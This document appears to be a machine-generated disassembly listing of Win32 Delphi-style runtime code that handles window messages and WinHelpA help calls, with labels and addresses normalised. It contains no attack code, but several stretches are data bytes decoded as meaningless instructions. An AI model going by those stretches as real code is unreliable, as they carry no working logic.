call sub_443e94
mov eax [ ebp - 0x4 ]
call sub_443f64
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SendMessageA
push ebp
call sub_436e08
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43d090
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403320
sub_436f50
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_436a64
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_440a18
mov eax ebx
mov si 0xffc8
call sub_403320
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_436fa7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6399173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_443c60
push eax
call SendMessageA
pop ebx
retn
sub_436fdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437051
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d484
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4545a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4430e4
mov eax ebx
mov si 0xffb8
call sub_403320
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437058
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_437060
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403320
jmp r-xdata
pop esi
retn
sub_437090
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4370b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4370bc
retn
sub_4370cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] ah
mov ah 0x41
add [ eax - 0x4c ] dl
inc ecx
add [ esp + esi * 4 ] ah
inc ecx
add [ eax - 0x6b ] ch
inc esp
add [ eax ] bh
sahf
inc esp
add al dl
popfd
inc esp
add [ ecx ] cl
inc esp
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x69746341
outsd
outsb
js r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x71 ] ch
inc ebx
add [ eax - 0x34000000 ] ah
xchg ecx eax
inc esp
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
hlt
pop [ 0x0 ]
inc ebx
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
or [ ebx + 0x7ee8f0c4 ] al
retn 0xfffc
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
adc al 0x71
inc ebx
add [ edx + edx * 4 + 0x40044 ] ch
or [ ebx + 0x74 ] dl
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] eax
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
add bh bh
nop
sahf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040003 ] al
imul ebp [ esi + 0x74 ] 0x5300408d
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449aa0
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
add esp 0xc
call sub_4034a0
pop [ fs : 0x0 ]
sub_4371bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449aa0
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4371f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43721d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437224
retn
sub_4372c8
test eax 0xb3004372
jb r-xdata
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ ebp + 0x61004372 ] bh
jb r-xdata
mov bl 0x72
inc ebx
cmp cl al
jb r-xdata
jns r-xdata
add al al
dec edi
add [ ecx + 0x72 ] ch
inc ebx
add [ ecx + 0x72 ] dh
inc ebx
add [ ecx + 0x72 ] bh
inc ebx
add [ ecx - 0x76ffbc8e ] al
jb r-xdata
inc ebx
add [ ebx + esi * 2 ] cl
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ ecx - 0x66ffbc8e ] dl
jb r-xdata
push cs
add [ eax + eax ] ah
add [ eax ] al
lodsb [ esi ]
adc [ eax ] eax
insb
xor eax [ eax ]
sbb [ esi + 0x40 ] dl
add [ esi + edx * 2 ] ah
inc eax
add [ eax + 0x74004033 ] al
xor eax [ eax ]
xor al 0x56
mov [ edx + 0x43 ] esi
cmp cl al
jb r-xdata
jns r-xdata
add al al
dec edi
add [ ecx + 0x41004372 ] ah
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f90
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov [ fs : eax ] esp
mov eax esi
call sub_403ef8
test edi edi
jne r-xdata
inc ebx
add [ edi + edi * 8 + 0x30 ] ah
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437491
push [ fs : eax ]
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
call 0x1c43b626
add [ eax ] al
add [ esi ] cl
add [ eax ] al
0x4373
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
inc ebx
add [ ecx + 0x72 ] cl
inc ebx
add [ ecx + 0x72 ] dl
inc ebx
add [ ecx + 0x72 ] bl
inc ebx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop ecx
jb r-xdata
cmp cl al
jb r-xdata
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437498
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404278
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0xe
pop edi
cld
add [ ecx ] bh
jb r-xdata
inc eax
add al bl
xor [ eax ] al
push eax
jle r-xdata
inc eax
add [ ebx + esi + 0x40 ] dh
add [ esi + edx * 2 ] dh
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004373 ] dh
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + 0x4373 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl cl
jae r-xdata
sub_4373dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437491
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403ef8
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f90
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437498
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404278
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4374ac
push ebx
mov ebx eax
mov eax ebx
call sub_4377dc
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405598
sub_4374e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43754f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4373dc
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437556
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_437560
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4375e8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4374d4
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404278
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4375ef
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
sub_4375fb
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437683
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_437d20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43768a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4373dc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437608
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437683
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_437d20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43768a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4373dc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437690
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437788
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4373dc
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax ebx
call sub_437d20
test al al
je r-xdata
mov ecx sub_437230
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43778f
lea eax [ ebp - 0x1c ]
call sub_403ef8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4373dc
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_437c78
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4377f8
push ebx
mov ebx eax
mov eax ebx
call sub_4377dc
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405598
pop ebx
retn
mov eax rw-data
call sub_405598
sub_437828
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437880
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437887
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4373dc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_437890
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437986
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408ce8
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4373dc
mov eax ebx
call sub_437d20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43798d
lea eax [ ebp - 0x110 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404168
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_437c78
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404168
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4379a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437a06
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a0d
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4373dc
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_437a18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437a98
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4373dc
mov eax ebx
call sub_437d20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a9f
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_437c78
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437aa8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_437b93
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_437d20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437b9a
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f1c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407e94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_437c78
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407e94
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f4c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4373dc
mov eax [ ebp - 0x14 ]
call sub_4043b8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_437ba8
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_40874c
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_437c03
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408728
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_437c78
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_437cee
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_437c5c
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437cf5
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407bbc
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_437d04
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_437d20
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_437c5c
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_437d00
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_437d04
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_437d7c
sub_437d7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_437df9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4377dc
call GetTickCount
mov ebx eax
push 0x0
call sub_40611c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4373dc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e00
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437e08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403448
call sub_4055b0
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_437e50
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_437e7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_437eea
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437ef1
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405598
mov eax rw-data
call sub_405598
mov eax rw-data
call sub_405598
mov eax rw-data
call sub_403ef8
mov eax rw-data
call sub_405598
mov eax [ rw-data ]
call sub_4374ac
sub_437ef4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_437f46
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f4d
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_437e08
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405598
mov edx eax
mov eax [ rw-data ]
call sub_426288
sub_437f54
add [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x80
jae r-xdata
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
inc ebx
add [ eax - 0x56 ] ah
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
inc ebx
add [ eax + eax ] dh
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 4 ] dh
jb r-xdata
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ ebx ] cl
push esp
add al 0xaa
je r-xdata
inc ebx
add [ eax - 0x56 ] ah
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add ah bh
stosb [ edi ]
inc ebx
add ah ch
test eax 0xa9e80043
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ edx + ebp * 4 ] al
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 - 0x80 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx - 0x80 ] si
inc ebx
add [ ecx + edx ] cl
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
insb
jg r-xdata
inc ebx
add [ edx + ebp * 4 ] al
insd
add [ ecx + eax * 4 + r--data ] ah
add [ eax ] al
inc esp
jb r-xdata
add [ eax ] dl
stosb [ edi ]
outsd
insb
jae r-xdata
je r-xdata
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x7f ] ch
inc ebx
add [ esi ] al
popad
insb
dec esi
outsd
outsb
